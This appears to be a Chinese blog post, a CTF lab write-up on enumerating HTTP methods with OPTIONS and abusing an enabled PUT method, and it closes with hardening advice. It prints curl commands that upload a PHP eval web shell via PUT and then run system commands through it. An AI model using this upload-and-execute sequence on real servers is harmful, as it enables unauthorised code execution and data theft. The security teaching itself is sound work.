---
title: "HTTP 方法枚举与 PUT 风险：从 OPTIONS 探测到配置加固"
description: 通过授权靶场分析 OPTIONS 方法枚举与 PUT 写入风险，记录识别思路、验证过程、必要条件以及服务端方法限制与权限加固方案。
excerpt: 通过授权靶场分析 OPTIONS 方法枚举与 PUT 写入风险，记录识别思路、验证过程、必要条件以及服务端方法限制与权限加固方案。
author: Lee
disableNunjucks: true
date: 2026-08-04 14:44:27
updated: 2026-09-04 00:00:00
categories:
  - 漏洞研究
tags:
  - HTTP
  - 方法枚举
  - PUT
  - Web安全
article_status: 待复验
difficulty: 中级
original_sources:
  - https://blog.csdn.net/2403_88102829/article/details/163472901
---

> **文章状态：待复验**  
> 本文由 Lee 的 CSDN 原创学习记录迁移并重新整理。以下操作仅限自建环境、CTF 与明确授权靶场，请勿用于未授权目标。

## 学习目标

- 理解 OPTIONS 响应与 Allow 头的意义
- 识别 PUT 风险成立所需的写入和执行条件
- 从服务端配置角度限制不必要的 HTTP 方法

## 实验说明

- 难度：中级
- 范围：本地或公开授权靶场
- 复验状态：正文已完成格式迁移，关键结论将在后续使用固定环境重新验证

## 原始实验记录

通过发送 `OPTIONS` 请求来探测服务器支持的 HTTP 方法。

示例环境：`[NSSRound#1 Basic] basic_check`

![实验截图 1](/images/csdn/163472901/01.png)

页面直接返回了当前 PHP 源码，常规请求都会被应用逻辑拦截并返回相同内容。

题目标签指向 HTTP 协议与中间件配置，因此先从服务器允许的请求方法入手。

#### HTTP 方法枚举

除常见的 GET（获取资源）和 POST（提交数据）外，本实验还关注 PUT（创建或覆盖资源）、DELETE（删除资源）与 OPTIONS（查询服务器支持的方法）。

```
curl -X PUT http://xxx.com          # 发送 PUT 请求
curl -X POST http://xxx.com         # 发送 POST 请求
curl -X OPTIONS http://xxx.com      # 发送 OPTIONS 请求
curl -X DELETE http://xxx.com       # 发送 DELETE 请求

-X：告诉curl用哪种http方法
-d：发送的请求里携带了什么数据
```

使用 curl 发送 OPTIONS 请求后，服务器可能通过 `Allow` 响应头列出支持的方法：

```
Allow: GET, POST, OPTIONS, PUT  #列举服务器允许的http请求方式
```

由于动态页面始终返回源码，本实验改用静态路径验证方法配置和文件写入行为。

![实验截图 2](/images/csdn/163472901/02.png)

响应表明服务器开放了四种请求方法。

#### PUT攻击

继续验证 PUT 是否真正具备写入能力。服务器返回 `201 Created`，说明测试文件已经创建。

![实验截图 3](/images/csdn/163472901/03.png)

写入成功

![实验截图 4](/images/csdn/163472901/04.png)

在授权靶场中，随后验证文件写入能否进一步形成代码执行。以下目标域名已经脱敏：

```
# 写入仅用于授权靶场验证的测试文件
curl -X PUT http://authorized-lab.local/shell.php -d "<?php eval(\$_POST[1]);?>"
# 在靶场内验证代码执行
curl -X POST http://authorized-lab.local/shell.php -d "1=system('tac /f*');"

# POST 请求体中传入参数 1
# system 函数会把字符串作为系统命令执行并返回输出
```

## 防御与复盘

- 仅开放业务实际需要的 HTTP 方法，并在反向代理与应用层同时校验。
- 上传或写入目录与可执行目录分离，避免文件写入直接演变为代码执行。
- 记录异常 OPTIONS、PUT、DELETE 请求，并结合来源、路径和响应状态进行告警。

## 原文出处

- [CSDN 原创记录](https://blog.csdn.net/2403_88102829/article/details/163472901)
